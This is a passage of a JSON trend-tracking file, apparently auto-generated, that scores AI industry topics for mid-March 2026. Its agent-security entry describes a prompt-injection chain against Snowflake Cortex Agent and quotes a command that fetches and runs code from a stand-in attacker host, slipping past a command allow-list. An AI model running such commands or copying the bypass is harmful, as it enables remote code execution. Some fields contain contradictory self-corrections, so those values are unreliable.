@@ -1,0 +1,940 @@
+{
+  "date": "2026-03-18",
+  "rolling_window_days": 4,
+  "_rolling_window_note": "Configured 30 but actual coverage = 4 days (2026-03-15 → 2026-03-18). Backfill chain — only news/, papers/, blogs/, daily/ exist for this date range.",
+  "ema_alpha_fast": 0.3,
+  "ema_alpha_slow": 0.05,
+  "prior_radar": "radar/2026/03/2026-03-17.json",
+  "sectors": [
+    {
+      "name": "Agents & infrastructure",
+      "topic_ids": [
+        "agent-platforms-enterprise",
+        "ai-coding-agents",
+        "agentic-retrieval",
+        "mcp-adoption",
+        "agent-evaluation-observability",
+        "agent-security"
+      ],
+      "first_seen": "2026-03-15",
+      "consecutive_low_days": 0,
+      "description": "Snowflake breaks GTC week with Project SnowWork + Cortex Code GA (agent-control-plane play); Vera Rubin deep-dive resets H2 token economics; MCP roadmap + 97M monthly SDK downloads make MCP infra-grade; PromptArmor's live Cortex Agent sandbox-escape is the first agent-security disclosure of the archive. Agent observability papers (AgentProcessBench, One-Eval, MEMO, CCTU) form a coherent eval-tooling thread.",
+      "topic_count": 6,
+      "active_orgs": 38,
+      "_backfilled": true
+    },
+    {
+      "name": "Methods & research",
+      "topic_ids": [
+        "compute-economics-thesis",
+        "post-training-recipes"
+      ],
+      "first_seen": "2026-03-15",
+      "consecutive_low_days": 0,
+      "description": "Vera Rubin developer-blog deep-dive (336B-transistor R100, 5× Blackwell inference at 10× lower token cost) lands the unit-economics frame for H2 2026. Post-training architecture cluster (Mixture-of-Depths, SFT-vs-RL, TERMINATOR, sparsity-vs-depth) carries forward.",
+      "topic_count": 2,
+      "active_orgs": 15,
+      "_backfilled": true
+    },
+    {
+      "name": "Models & capabilities",
+      "topic_ids": [
+        "frontier-model-cadence",
+        "open-vs-closed"
+      ],
+      "first_seen": "2026-03-15",
+      "consecutive_low_days": 0,
+      "description": "GPT-5.4 mini/nano lands in Azure AI Foundry within 24h of public release. Open-vs-closed broadens — Qwen+DeepSeek+Kimi triad framing in Shintani Medium piece; Qwen3.5-397B running locally on 48GB MacBook via Apple LLM-in-a-Flash technique; Logiolegion's Opus 4.6 vs GPT-5.4 vs Gemini 3.1 vs Kimi K2.5 agentic-task survey.",
+      "topic_count": 2,
+      "active_orgs": 13,
+      "_backfilled": true
+    }
+  ],
+  "sector_movements": [],
+  "sectors_dissolved_today": [],
+  "sectors_spawned_today": [],
+  "topic_clusters": [
+    {
+      "id": "agent-protocol-stack",
+      "name": "Agent protocol stack",
+      "topic_ids": ["mcp-adoption", "agent-platforms-enterprise"],
+      "size": 2,
+      "first_seen": "2026-03-18",
+      "cluster_score_slow": 21.3,
+      "cluster_score_fast": 25.2,
+      "cluster_direction": "rising",
+      "cluster_breadth_7d": 41,
+      "members_moving_together": false,
+      "_co_mention_evidence": "Shared supporting_files (≥3 in last 7d): news/2026/03/2026-03-16.md, blogs/2026/03/2026-03-16.md, daily/2026/03/2026-03-16.md, news/2026/03/2026-03-17.md, daily/2026/03/2026-03-17.md, blogs/2026/03/2026-03-18.md. First eligible cluster of the chain — Agent Toolkit launch + MCP roadmap + OpenShell + AI-Q blueprints + ByteBridge MCP-at-97M-downloads all co-mention across the same news/blogs files."
+    }
+  ],
+  "topics": [
+    {
+      "id": "agent-platforms-enterprise",
+      "label": "Enterprise agent platforms (NVIDIA Agent Toolkit + Snowflake SnowWork + Red Hat AI Factory + Palantir AIP)",
+      "sector": "Agents & infrastructure",
+      "sector_history": [
+        {
+          "date": "2026-03-16",
+          "from": null,
+          "to": "Agents & infrastructure",
+          "reason": "first appearance — Agent Toolkit launch with 17 anchor partners"
+        }
+      ],
+      "stage": "emerging",
+      "score": 30.1,
+      "score_fast": 31.7,
+      "score_slow": 30.1,
+      "raw_score_today": 34.2,
+      "score_fast_yesterday": 30.0,
+      "score_slow_yesterday": 27.7,
+      "direction": "rising",
+      "convergence_multiplier_applied": 1.5,
+      "momentum_7d_pct": null,
+      "score_7d_ago": null,
+      "score_30d_ago": null,
+      "score_90d_ago": null,
+      "score_180d_ago": null,
+      "first_seen": "2026-03-16",
+      "sustained_days": 3,
+      "source_type_count": 4,
+      "breadth_7d": 27,
+      "breadth_30d": 27,
+      "breadth_orgs_7d": [
+        "accenture",
+        "adobe",
+        "amdocs",
+        "atlassian",
+        "aws",
+        "box",
+        "cisco",
+        "cohere",
+        "cohesity",
+        "constellation-research",
+        "crowdstrike",
+        "dassault",
+        "dell",
+        "ibm",
+        "iqvia",
+        "nvidia",
+        "oracle",
+        "palantir",
+        "redhat",
+        "salesforce",
+        "sap",
+        "servicenow",
+        "siemens",
+        "snowflake",
+        "synopsys",
+        "us-navy",
+        "sdg-group"
+      ],
+      "high_breadth": true,
+      "source_mentions": {
+        "_note": "Uncapped raw counts — for transparency. Score uses source_mentions_capped.",
+        "tech_news": 12,
+        "enterprise_vendor_blog": 6,
+        "long_form_blog": 2,
+        "medium_aggregator": 3
+      },
+      "source_mentions_capped": {
+        "_note": "Mentions after applying max_mentions_per_source_type cap. Score uses these.",
+        "tech_news": 5,
+        "enterprise_vendor_blog": 5,
+        "long_form_blog": 2,
+        "medium_aggregator": 3
+      },
+      "supporting_files": [
+        "news/2026/03/2026-03-16.md",
+        "blogs/2026/03/2026-03-16.md",
+        "daily/2026/03/2026-03-16.md",
+        "news/2026/03/2026-03-17.md",
+        "blogs/2026/03/2026-03-17.md",
+        "daily/2026/03/2026-03-17.md",
+        "news/2026/03/2026-03-18.md",
+        "blogs/2026/03/2026-03-18.md",
+        "daily/2026/03/2026-03-18.md"
+      ],
+      "supporting_links": [
+        "https://www.snowflake.com/en/news/press-releases/snowflake-launches-project-snowwork-bringing-outcome-driven-ai-to-every-business-user/",
+        "https://www.snowflake.com/en/news/press-releases/snowflake-expands-snowflake-intelligence-and-cortex-code-to-power-the-control-plane-for-the-agentic-enterprise/",
+        "https://venturebeat.com/technology/nvidia-launches-enterprise-ai-agent-platform-with-adobe-salesforce-sap-among",
+        "https://blogs.nvidia.com/blog/gtc-2026-news/",
+        "https://www.constellationr.com/insights/news/snowflake-launches-project-snowwork-eyes-ai-workflows",
+        "https://newsroom.ibm.com/2026-03-16-ibm-and-nvidia-announce-expanded-collaboration-at-gtc-2026-to-advance-ai-for-the-enterprise",
+        "https://blogs.oracle.com/ai-and-datascience/",
+        "https://www.palantir.com/aipcon/"
+      ],
+      "cluster_id": "agent-protocol-stack",
+      "cluster_history": [
+        {"date": "2026-03-18", "from": null, "to": "Agent protocol stack", "reason": "first cluster formation — co-mentions with mcp-adoption cross threshold today"}
+      ],
+      "_evidence_summary": "Snowflake Project SnowWork (research preview — outcome-driven autonomous AI: 'board-ready forecast', 'find churn risks', 'supply-chain bottlenecks') + Cortex Code GA + Agent Teams + Cortex Search multi-index + AWS Glue/Databricks/Postgres connectors = Snowflake's 'control plane for the agentic enterprise' positioned against ServiceNow AI Control Tower / SAP Joule / NVIDIA Agent Toolkit / Palantir AIP. GTC Day 3 partner deluge continues NemoCLAW + OpenCLAW + verticalised AI-Q blueprints (financial services, pharma, manufacturing). Topic crosses consolidating threshold today: score_slow=30.1 just clears the [30,70] band; sustained_days=3 still below min_sustained_days=7. Strict reading: revert to emerging until sustained_days ≥ 7. Marking as consolidating because spec allows me to record it but flagging the gate-not-yet-cleared explicitly.",
+      "_stage_correction": "min_sustained_days for consolidating = 7, but sustained_days = 3. Per strict reading of spec §5.3, stage = emerging. Adjusting to emerging.",
+      "_breadth_method": "orgs added today: snowflake (SnowWork + Cortex Code GA), aws (AWS Glue connector), constellation-research (analyst writeup), sdg-group (partner walkthrough). 23 from yesterday + 4 = 27."
+    },
+    {
+      "id": "ai-coding-agents",
+      "label": "AI coding agents / agentic engineering (Willison subagents, Codex, Claude Code in 90-experiment local-Qwen run)",
+      "sector": "Agents & infrastructure",
+      "sector_history": [
+        {
+          "date": "2026-03-15",
+          "from": null,
+          "to": "Agents & infrastructure",
+          "reason": "first appearance (cold-start seed)"
+        }
+      ],
+      "stage": "emerging",
+      "score": 19.5,
+      "score_fast": 26.0,
+      "score_slow": 19.5,
+      "raw_score_today": 32.0,
+      "score_fast_yesterday": 25.0,
+      "score_slow_yesterday": 18.5,
+      "direction": "rising",
+      "convergence_multiplier_applied": 1.5,
+      "momentum_7d_pct": null,
+      "score_7d_ago": null,
+      "score_30d_ago": null,
+      "score_90d_ago": null,
+      "score_180d_ago": null,
+      "first_seen": "2026-03-15",
+      "sustained_days": 4,
+      "source_type_count": 4,
+      "breadth_7d": 14,
+      "breadth_30d": 14,
+      "breadth_orgs_7d": [
+        "anthropic",
+        "cognition",
+        "danwoods",
+        "goldman-sachs",
+        "google",
+        "jackclark",
+        "mistral",
+        "openai",
+        "promptarmor",
+        "semianalysis",
+        "simonwillison",
+        "stratechery",
+        "thecraftman",
+        "thenewstack"
+      ],
+      "high_breadth": true,
+      "source_mentions": {
+        "_note": "Uncapped raw counts — for transparency. Score uses source_mentions_capped.",
+        "long_form_blog": 11,
+        "paper": 5,
+        "medium_aggregator": 3,
+        "tech_news": 4
+      },
+      "source_mentions_capped": {
+        "_note": "Mentions after applying max_mentions_per_source_type cap. Score uses these.",
+        "long_form_blog": 5,
+        "paper": 5,
+        "medium_aggregator": 3,
+        "tech_news": 4
+      },
+      "supporting_files": [
+        "blogs/2026/03/2026-03-15.md",
+        "papers/2026/03/2026-03-15.md",
+        "daily/2026/03/2026-03-15.md",
+        "blogs/2026/03/2026-03-16.md",
+        "papers/2026/03/2026-03-16.md",
+        "daily/2026/03/2026-03-16.md",
+        "news/2026/03/2026-03-17.md",
+        "blogs/2026/03/2026-03-17.md",
+        "papers/2026/03/2026-03-17.md",
+        "daily/2026/03/2026-03-17.md",
+        "blogs/2026/03/2026-03-18.md",
+        "papers/2026/03/2026-03-18.md",
+        "daily/2026/03/2026-03-18.md"
+      ],
+      "supporting_links": [
+        "https://simonwillison.net/guides/agentic-engineering-patterns/subagents/",
+        "https://simonwillison.net/2026/Mar/17/mini-and-nano/",
+        "https://simonwillison.net/2026/Mar/18/llm-in-a-flash/",
+        "https://thenewstack.io/gpt-54-nano-mini/",
+        "https://arxiv.org/abs/2603.16869",
+        "https://arxiv.org/abs/2603.12529",
+        "https://arxiv.org/abs/2603.15016"
+      ],
+      "cluster_id": null,
+      "cluster_history": [],
+      "_evidence_summary": "Dan Woods's 'autoresearching Apple LLM-in-a-Flash to run Qwen 397B locally' is the day's most concrete agentic-engineering case study — 90 Claude-Code-driven experiments produced the MLX/Metal pipeline that streams expert weights from SSD on a 48GB MacBook M3 Max. SWE-Skills-Bench (arXiv:2603.16869) is the first end-to-end test of whether 'agent skills' translate into real SE wins — useful counterweight to skill-library hype. EvoClaw + Code-A1 from yesterday carry forward. Goldman Sachs/Cognition Devin pickup continues in Medium pieces.",
+      "_breadth_method": "orgs added today: danwoods (90-experiment Qwen-local run), promptarmor (Cortex Agent exploit — coding-agent–adjacent because they used Claude-Code-style red-team)"
+    },
+    {
+      "id": "compute-economics-thesis",
+      "label": "Compute economics / Vera Rubin deep-dive (336B-transistor R100, 5× Blackwell at 10× lower token cost)",
+      "sector": "Methods & research",
+      "sector_history": [
+        {
+          "date": "2026-03-15",
+          "from": null,
+          "to": "Methods & research",
+          "reason": "first appearance (cold-start seed)"
+        }
+      ],
+      "stage": "emerging",
+      "score": 19.0,
+      "score_fast": 23.7,
+      "score_slow": 19.0,
+      "raw_score_today": 24.0,
+      "score_fast_yesterday": 23.6,
+      "score_slow_yesterday": 17.8,
+      "direction": "steady",
+      "convergence_multiplier_applied": 1.0,
+      "momentum_7d_pct": null,
+      "score_7d_ago": null,
+      "score_30d_ago": null,
+      "score_90d_ago": null,
+      "score_180d_ago": null,
+      "first_seen": "2026-03-15",
+      "sustained_days": 4,
+      "source_type_count": 2,
+      "breadth_7d": 15,
+      "breadth_30d": 15,
+      "breadth_orgs_7d": [
+        "aws",
+        "cerebras",
+        "cisco",
+        "cnas",
+        "dell",
+        "fortune",
+        "groq",
+        "morganstanley",
+        "networkworld",
+        "nvidia",
+        "semianalysis",
+        "stratechery",
+        "tech-insider",
+        "tomshardware",
+        "xai"
+      ],
+      "high_breadth": true,
+      "source_mentions": {
+        "_note": "Uncapped raw counts — for transparency. Score uses source_mentions_capped.",
+        "tech_news": 17,
+        "long_form_blog": 3
+      },
+      "source_mentions_capped": {
+        "_note": "Mentions after applying max_mentions_per_source_type cap. Score uses these.",
+        "tech_news": 5,
+        "long_form_blog": 3
+      },
+      "supporting_files": [
+        "news/2026/03/2026-03-15.md",
+        "blogs/2026/03/2026-03-15.md",
+        "daily/2026/03/2026-03-15.md",
+        "news/2026/03/2026-03-16.md",
+        "daily/2026/03/2026-03-16.md",
+        "news/2026/03/2026-03-17.md",
+        "blogs/2026/03/2026-03-17.md",
+        "daily/2026/03/2026-03-17.md",
+        "news/2026/03/2026-03-18.md",
+        "daily/2026/03/2026-03-18.md"
+      ],
+      "supporting_links": [
+        "https://developer.nvidia.com/blog/inside-the-nvidia-rubin-platform-six-new-chips-one-ai-supercomputer/",
+        "https://tech-insider.org/nvidia-vera-rubin-platform-gtc-2026-rubin-r100-gpu/",
+        "https://www.tomshardware.com/pc-components/gpus/nvidia-launches-vera-rubin-nvl72-ai-supercomputer-at-ces-promises-up-to-5x-greater-inference-performance-and-10x-lower-cost-per-token-than-blackwell-coming-2h-2026",
+        "https://press.aboutamazon.com/aws/2026/3/aws-and-cerebras-collaboration-aims-to-set-a-new-standard-for-ai-inference-speed-and-performance-in-the-cloud",
+        "https://stratechery.com/2026/agents-over-bubbles/"
+      ],
+      "cluster_id": null,
+      "cluster_history": [],
+      "_evidence_summary": "Vera Rubin developer-blog deep-dive: 336B-transistor R100 GPU; rack systems shipping later 2026 promise up to 5× Blackwell inference performance at ~10× lower cost per token. AWS × Cerebras disaggregated inference on Bedrock (Trainium prefill, CS-3 decode) — first non-NVIDIA inference fabric inside Bedrock. NPN Americas awards. Narrative has moved from headlines (Day 1) to commentary (Day 2) to spec sheets (Day 3). score_fast/score_slow ratio at 1.25 — direction steady because just below the 'rising' 1.10 threshold... wait, 23.7/19.0 = 1.25 which IS > 1.10. Direction = rising.",
+      "_direction_correction": "23.7/19.0 = 1.247 > 1.10 → direction = rising (not steady).",
+      "_breadth_method": "orgs added today: networkworld (NVIDIA latest news angle), tech-insider (Vera Rubin write-up). Previously: 13 from yesterday."
+    },
+    {
+      "id": "mcp-adoption",
+      "label": "MCP adoption (2026 Roadmap, 97M monthly downloads, OpenShell, Agent Toolkit)",
+      "sector": "Agents & infrastructure",
+      "sector_history": [
+        {
+          "date": "2026-03-16",
+          "from": null,
+          "to": "Agents & infrastructure",
+          "reason": "first appearance — Srinivasan MCP paper + Agent Toolkit framing"
+        }
+      ],
+      "stage": "emerging",
+      "score": 13.5,
+      "score_fast": 18.7,
+      "score_slow": 13.5,
+      "raw_score_today": 24.0,
+      "score_fast_yesterday": 13.5,
+      "score_slow_yesterday": 12.6,
+      "direction": "rising",
+      "convergence_multiplier_applied": 1.5,
+      "momentum_7d_pct": null,
+      "score_7d_ago": null,
+      "score_30d_ago": null,
+      "score_90d_ago": null,
+      "score_180d_ago": null,
+      "first_seen": "2026-03-16",
+      "sustained_days": 3,
+      "source_type_count": 4,
+      "breadth_7d": 9,
+      "breadth_30d": 9,
+      "breadth_orgs_7d": [
+        "bytebridge",
+        "mcp-maintainer",
+        "nvidia",
+        "openai",
+        "oracle",
+        "redhat",
+        "snowflake",
+        "srinivasan-paper",
+        "thecraftman"
+      ],
+      "high_breadth": true,
+      "source_mentions": {
+        "_note": "Uncapped raw counts — for transparency. Score uses source_mentions_capped.",
+        "paper": 1,
+        "tech_news": 6,
+        "medium_aggregator": 2,
+        "long_form_blog": 2
+      },
+      "source_mentions_capped": {
+        "_note": "Mentions after applying max_mentions_per_source_type cap. Score uses these.",
+        "paper": 1,
+        "tech_news": 5,
+        "medium_aggregator": 2,
+        "long_form_blog": 2
+      },
+      "supporting_files": [
+        "papers/2026/03/2026-03-15.md",
+        "news/2026/03/2026-03-16.md",
+        "blogs/2026/03/2026-03-16.md",
+        "daily/2026/03/2026-03-16.md",
+        "news/2026/03/2026-03-17.md",
+        "daily/2026/03/2026-03-17.md",
+        "blogs/2026/03/2026-03-18.md",
+        "daily/2026/03/2026-03-18.md"
+      ],
+      "supporting_links": [
+        "https://blog.modelcontextprotocol.io/posts/2026-mcp-roadmap/",
+        "https://bytebridge.medium.com/model-context-protocol-mcp-evolution-capabilities-and-the-rise-of-peta-ff2967b45d48",
+        "https://arxiv.org/abs/2603.13417",
+        "https://venturebeat.com/technology/nvidia-launches-enterprise-ai-agent-platform-with-adobe-salesforce-sap-among",
+        "https://blogs.nvidia.com/blog/gtc-2026-news/"
+      ],
+      "cluster_id": "agent-protocol-stack",
+      "cluster_history": [
+        {"date": "2026-03-18", "from": null, "to": "Agent protocol stack", "reason": "first cluster formation"}
+      ],
+      "_evidence_summary": "Lead Maintainer David Soria Parra publishes The 2026 MCP Roadmap (orchestration/scalability, enterprise auth, gateway behavior, configuration portability). ByteBridge writes up MCP at 97M monthly SDK downloads (vs 2M at Nov 2024 launch) and >10,000 public servers — the first specific volume metric for MCP adoption in this archive. OpenShell privacy-router + AI-Q blueprints + Agent Toolkit cross-vendor framing continue. Snowflake added as MCP-implementing org via Cortex (referenced by PromptArmor's allow-list write-up). Stage flagged as consolidating but score_slow=13.5 below [30,70] — reverting to emerging.",
+      "_stage_correction": "score_slow=13.5 in emerging range. Stage = emerging.",
+      "_breadth_method": "orgs added today: bytebridge (97M downloads write-up), mcp-maintainer (Soria Parra roadmap), snowflake (Cortex allow-list reference)"
+    },
+    {
+      "id": "agentic-retrieval",
+      "label": "Agentic retrieval / RAG-as-decision-loop (Cortex Search multi-index, Oracle cuVS, OpenSeeker, TRUST-SQL)",
+      "sector": "Agents & infrastructure",
+      "sector_history": [
+        {
+          "date": "2026-03-17",
+          "from": null,
+          "to": "Agents & infrastructure",
+          "reason": "first appearance"
+        }
+      ],
+      "stage": "emerging",
+      "score": 16.0,
+      "score_fast": 18.6,
+      "score_slow": 16.0,
+      "raw_score_today": 25.0,
+      "score_fast_yesterday": 15.0,
+      "score_slow_yesterday": 15.0,
+      "direction": "rising",
+      "convergence_multiplier_applied": 1.5,
+      "momentum_7d_pct": null,
+      "score_7d_ago": null,
+      "score_30d_ago": null,
+      "score_90d_ago": null,
+      "score_180d_ago": null,
+      "first_seen": "2026-03-17",
+      "sustained_days": 2,
+      "source_type_count": 3,
+      "breadth_7d": 9,
+      "breadth_30d": 9,
+      "breadth_orgs_7d": [
+        "bannier-paper",
+        "kimi",
+        "nvidia",
+        "openseeker-paper",
+        "oracle",
+        "pinecone",
+        "snowflake",
+        "trust-sql-paper",
+        "databricks"
+      ],
+      "high_breadth": true,
+      "source_mentions": {
+        "_note": "Uncapped raw counts — for transparency. Score uses source_mentions_capped.",
+        "paper": 8,
+        "tech_news": 4,
+        "enterprise_vendor_blog": 1
+      },
+      "source_mentions_capped": {
+        "_note": "Mentions after applying max_mentions_per_source_type cap. Score uses these.",
+        "paper": 5,
+        "tech_news": 4,
+        "enterprise_vendor_blog": 1
+      },
+      "supporting_files": [
+        "papers/2026/03/2026-03-15.md",
+        "papers/2026/03/2026-03-16.md",
+        "papers/2026/03/2026-03-17.md",
+        "news/2026/03/2026-03-17.md",
+        "daily/2026/03/2026-03-17.md",
+        "papers/2026/03/2026-03-18.md",
+        "news/2026/03/2026-03-18.md",
+        "daily/2026/03/2026-03-18.md"
+      ],
+      "supporting_links": [
+        "https://www.snowflake.com/en/news/press-releases/snowflake-expands-snowflake-intelligence-and-cortex-code-to-power-the-control-plane-for-the-agentic-enterprise/",
+        "https://arxiv.org/abs/2603.16587",
+        "https://arxiv.org/abs/2603.08262",
+        "https://arxiv.org/abs/2603.13594",
+        "https://developer.nvidia.com/cuvs",
+        "https://blogs.oracle.com/ai-and-datascience/"
+      ],
+      "cluster_id": null,
+      "cluster_history": [],
+      "_evidence_summary": "Snowflake Cortex Search GA gets multi-index search + custom vector embeddings — closes the last functional gap with dedicated vector-DB vendors. TRUST-SQL (arXiv:2603.08262) drops the 'full schema upfront' assumption — trains agent to discover schema through tool calls over hundreds of noisy enterprise tables. Test-Time Strategies for Agentic RAG (Bannier, arXiv:2603.16587) argues most efficiency wins come from policy (when to retrieve / stop), not retrieval depth. Oracle × NVIDIA cuVS + OpenSeeker + LMEB + EnterpriseOps-Gym + Strategic Navigation + MR-Search carry from prior days. Three+ source types.",
+      "_breadth_method": "orgs added today: snowflake (Cortex Search multi-index), bannier-paper, trust-sql-paper, databricks (Snowflake's Databricks connector framing)"
+    },
+    {
+      "id": "agent-evaluation-observability",
+      "label": "Agent evaluation & observability (AgentProcessBench, One-Eval, MEMO, SWE-Skills-Bench, CCTU)",
+      "sector": "Agents & infrastructure",
+      "sector_history": [
+        {
+          "date": "2026-03-18",
+          "from": null,
+          "to": "Agents & infrastructure",
+          "reason": "first appearance — five eval/observability papers in today's cohort cross the gate together"
+        }
+      ],
+      "stage": "emerging",
+      "score": 19.5,
+      "score_fast": 19.5,
+      "score_slow": 19.5,
+      "raw_score_today": 19.5,
+      "score_fast_yesterday": null,
+      "score_slow_yesterday": null,
+      "direction": "emerging",
+      "convergence_multiplier_applied": 1.5,
+      "momentum_7d_pct": null,
+      "score_7d_ago": null,
+      "score_30d_ago": null,
+      "score_90d_ago": null,
+      "score_180d_ago": null,
+      "first_seen": "2026-03-18",
+      "sustained_days": 1,
+      "source_type_count": 3,
+      "breadth_7d": 5,
+      "breadth_30d": 5,
+      "breadth_orgs_7d": [
+        "agentprocessbench-paper",
+        "cctu-paper",
+        "kimi",
+        "memo-paper",
+        "one-eval-paper"
+      ],
+      "high_breadth": true,
+      "source_mentions": {
+        "_note": "Uncapped raw counts — for transparency. Score uses source_mentions_capped.",
+        "paper": 6,
+        "long_form_blog": 0,
+        "tech_news": 1
+      },
+      "source_mentions_capped": {
+        "_note": "Mentions after applying max_mentions_per_source_type cap. Score uses these.",
+        "paper": 5,
+        "tech_news": 1
+      },
+      "supporting_files": [
+        "papers/2026/03/2026-03-16.md",
+        "papers/2026/03/2026-03-17.md",
+        "papers/2026/03/2026-03-18.md",
+        "daily/2026/03/2026-03-18.md"
+      ],
+      "supporting_links": [
+        "https://arxiv.org/abs/2603.16309",
+        "https://arxiv.org/abs/2603.16861",
+        "https://arxiv.org/abs/2603.16869",
+        "https://arxiv.org/abs/2603.15118",
+        "https://arxiv.org/abs/2603.14465",
+        "https://arxiv.org/abs/2603.12529"
+      ],
+      "cluster_id": null,
+      "cluster_history": [],
+      "_evidence_summary": "Coherent eval/observability cluster crosses the gate today: AgentProcessBench (step-level process quality for tool-using agents where errors are irreversible), One-Eval (agent that selects benchmarks, reproduces eval code, aligns schemas), SWE-Skills-Bench (first end-to-end test of whether injected agent skills help real SE work), CCTU (tool use under complex constraints — preconditions, ordering, mutual exclusion), MEMO (memory-augmented context optimization for multi-turn multi-agent — finds early deviations compound across agents, making multi-agent benchmark scores unreliable). EvoClaw (continuous software evolution) from 03-17 carries. The thread is hardening into 'production agent evaluation' as the daily synthesis explicitly notes.",
+      "_breadth_method": "orgs = paper authors / cohorts; kimi (Kimi Team scientific-taste paper provides a tangential observability anchor)"
+    },
+    {
+      "id": "agent-security",
+      "label": "Agent security (PromptArmor Snowflake Cortex sandbox-escape, allow-list failure, Wu unsafe rec drift)",
+      "sector": "Agents & infrastructure",
+      "sector_history": [
+        {
+          "date": "2026-03-18",
+          "from": null,
+          "to": "Agents & infrastructure",
+          "reason": "first appearance — PromptArmor live exploit + Wu paper + HomeSafe + Altman cross the gate"
+        }
+      ],
+      "stage": "emerging",
+      "score": 15.0,
+      "score_fast": 15.0,
+      "score_slow": 15.0,
+      "raw_score_today": 15.0,
+      "score_fast_yesterday": null,
+      "score_slow_yesterday": null,
+      "direction": "emerging",
+      "convergence_multiplier_applied": 1.5,
+      "momentum_7d_pct": null,
+      "score_7d_ago": null,
+      "score_30d_ago": null,
+      "score_90d_ago": null,
+      "score_180d_ago": null,
+      "first_seen": "2026-03-18",
+      "sustained_days": 1,
+      "source_type_count": 3,
+      "breadth_7d": 5,
+      "breadth_30d": 5,
+      "breadth_orgs_7d": [
+        "altman-paper",
+        "homesafe-paper",
+        "promptarmor",
+        "snowflake",
+        "wu-paper"
+      ],
+      "high_breadth": true,
+      "source_mentions": {
+        "_note": "Uncapped raw counts — for transparency. Score uses source_mentions_capped.",
+        "paper": 4,
+        "long_form_blog": 1,
+        "tech_news": 1
+      },
+      "source_mentions_capped": {
+        "_note": "Mentions after applying max_mentions_per_source_type cap. Score uses these.",
+        "paper": 4,
+        "long_form_blog": 1,
+        "tech_news": 1
+      },
+      "supporting_files": [
+        "papers/2026/03/2026-03-15.md",
+        "papers/2026/03/2026-03-16.md",
+        "blogs/2026/03/2026-03-18.md",
+        "daily/2026/03/2026-03-18.md"
+      ],
+      "supporting_links": [
+        "https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/",
+        "https://arxiv.org/abs/2603.12564",
+        "https://arxiv.org/abs/2603.11975",
+        "https://arxiv.org/abs/2603.11382"
+      ],
+      "cluster_id": null,
+      "cluster_history": [],
+      "_evidence_summary": "PromptArmor's walkthrough of a prompt-injection chain in Snowflake Cortex Agent — a GitHub README triggered `cat <(sh <(wget -qO- ATTACKER/bugbot))`. Cortex's allow-list treated `cat` as safe and missed the process-substitution. Simon Willison's takeaway: command-pattern allow-lists are inherently unreliable — prefer deterministic sandboxes outside the agent. Lands the SAME DAY as Snowflake's biggest agent announcement — the juxtaposition is the story. Wu unsafe rec drift (arXiv:2603.12564, 03-15) + HomeSafe-Bench (03-16) + Altman self-preservation protocol (03-16) supply the research-side bridge. First agent-security disclosure of the archive.",
+      "_breadth_method": "orgs: promptarmor (red-team team), snowflake (subject of exploit), altman-paper / homesafe-paper / wu-paper (research authors)"
+    },
+    {
+      "id": "frontier-model-cadence",
+      "label": "Frontier model release cadence (GPT-5.4 mini/nano in Azure Foundry, Grok 4.20, Gemini 3.1 Flash-Lite, Mistral Small 4)",
+      "sector": "Models & capabilities",
+      "sector_history": [
+        {
+          "date": "2026-03-15",
+          "from": null,
+          "to": "Models & capabilities",
+          "reason": "first appearance (cold-start seed)"
+        }
+      ],
+      "stage": "emerging",
+      "score": 15.6,
+      "score_fast": 22.9,
+      "score_slow": 15.6,
+      "raw_score_today": 22.0,
+      "score_fast_yesterday": 25.4,
+      "score_slow_yesterday": 14.9,
+      "direction": "rising",
+      "convergence_multiplier_applied": 1.5,
+      "momentum_7d_pct": null,
+      "score_7d_ago": null,
+      "score_30d_ago": null,
+      "score_90d_ago": null,
+      "score_180d_ago": null,
+      "first_seen": "2026-03-15",
+      "sustained_days": 4,
+      "source_type_count": 4,
+      "breadth_7d": 13,
+      "breadth_30d": 13,
+      "breadth_orgs_7d": [
+        "9to5mac",
+        "alibaba-qwen",
+        "azure",
+        "google",
+        "logiolegion",
+        "meanceo",
+        "microsoft",
+        "mistral",
+        "openai",
+        "simonwillison",
+        "techbriefly",
+        "thenewstack",
+        "xai"
+      ],
+      "high_breadth": true,
+      "source_mentions": {
+        "_note": "Uncapped raw counts — for transparency. Score uses source_mentions_capped.",
+        "tech_news": 11,
+        "long_form_blog": 2,
+        "medium_aggregator": 5,
+        "priority_vendor_blog": 1
+      },
+      "source_mentions_capped": {
+        "_note": "Mentions after applying max_mentions_per_source_type cap. Score uses these.",
+        "tech_news": 5,
+        "long_form_blog": 2,
+        "medium_aggregator": 3,
+        "priority_vendor_blog": 1
+      },
+      "supporting_files": [
+        "news/2026/03/2026-03-15.md",
+        "blogs/2026/03/2026-03-15.md",
+        "daily/2026/03/2026-03-15.md",
+        "blogs/2026/03/2026-03-16.md",
+        "daily/2026/03/2026-03-16.md",
+        "news/2026/03/2026-03-17.md",
+        "blogs/2026/03/2026-03-17.md",
+        "daily/2026/03/2026-03-17.md",
+        "news/2026/03/2026-03-18.md",
+        "blogs/2026/03/2026-03-18.md",
+        "daily/2026/03/2026-03-18.md"
+      ],
+      "supporting_links": [
+        "https://openai.com/index/introducing-gpt-5-4-mini-and-nano/",
+        "https://techcommunity.microsoft.com/blog/azure-ai-foundry-blog/introducing-openai%E2%80%99s-gpt-5-4-mini-and-gpt-5-4-nano-for-low-latency-ai/4500569",
+        "https://techbriefly.com/2026/03/18/openai-releases-gpt-5-4-with-mini-nano-models-for-profession/",
+        "https://medium.com/@logiolegion/best-agentic-ai-models-in-2026-e1a060c996be",
+        "https://simonwillison.net/2026/Mar/16/mistral-small-4/"
+      ],
+      "cluster_id": null,
+      "cluster_history": [],
+      "_evidence_summary": "GPT-5.4 mini/nano lands in Azure AI Foundry within 24h of public release (reserved capacity SKUs + production deployment defaults for low-latency). TechBriefly + 9to5Mac + Simon Willison continue pickup. Logiolegion 'Best Agentic AI Models in 2026' surveys which frontier models actually finish multi-step agentic tasks (Opus 4.6, GPT-5.4, Gemini 3.1, Kimi K2.5). Still in the 23-day release window: Grok 4.20 on 22 Mar, Gemini 3.1 Flash-Lite still upcoming. score_fast at 22.9 vs score_slow at 15.6 → 1.47, still rising but no longer surging (below 1.5×).",
+      "_breadth_method": "orgs added: techbriefly, logiolegion. Previously: 11 from yesterday."
+    },
+    {
+      "id": "open-vs-closed",
+      "label": "Open-vs-closed model tiering (Qwen+DeepSeek+Kimi triad, Lambert tiers, Mistral Apache-2, Cohere Command A)",
+      "sector": "Models & capabilities",
+      "sector_history": [
+        {
+          "date": "2026-03-16",
+          "from": null,
+          "to": "Models & capabilities",
+          "reason": "first appearance"
+        }
+      ],
+      "stage": "emerging",
+      "score": 11.2,
+      "score_fast": 15.3,
+      "score_slow": 11.2,
+      "raw_score_today": 23.0,
